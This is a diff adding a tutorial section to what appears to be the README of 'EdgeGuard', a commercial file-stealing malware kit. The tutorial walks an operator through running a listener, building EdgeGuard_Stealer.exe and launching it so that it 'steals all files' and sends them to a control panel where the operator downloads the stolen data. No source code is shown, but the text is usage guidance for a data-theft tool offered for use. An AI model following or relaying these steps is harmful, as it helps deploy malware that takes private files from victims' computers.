@@ -31,3 +31,41 @@ https://edgeguard.business/
 
 
 
+
+
+---
+
+## Tutorial
+
+First Run Listener.exe
+After Key Generated, you Can Close The Listener.exe or you can keep it, Does not Matter.
+
+
+
+
+Run The Edge Stealer.
+
+Go To Build Tab First,  And Click On Install Tools, you will see message please wait installation.
+[ While Installation Do Not Click Anywhere, Program Can suspend a bit, wait for message.. ]
+Then After Installation Finish, You Will See Message, Tools Installed,  Then Press OK And program will terminate.
+Run The Edge Stealer Again..
+
+And Now You Can Press BUILD,  And Wait For Build.
+
+After Build Done, You Will See EdgeGuard_Stealer.exe on the Currentdirectory.
+
+
+when you run finally edgeguard_stealer.exe on your test machine..  this can take a time, just wait...
+
+and it will steal all files and send to your Panel..
+
+Go To Main Page..  and press Connect To Server / Refresh,  and you will see stealed data there.
+
+You Can Do Right Click On The File, And Press on GET Data [ WARNING ]  Before doing that, you should wait 4-5 min, to make sure all
+files are stealed correctly.
+
+~EdgeGuard~  Regards..
+
+
+
+---
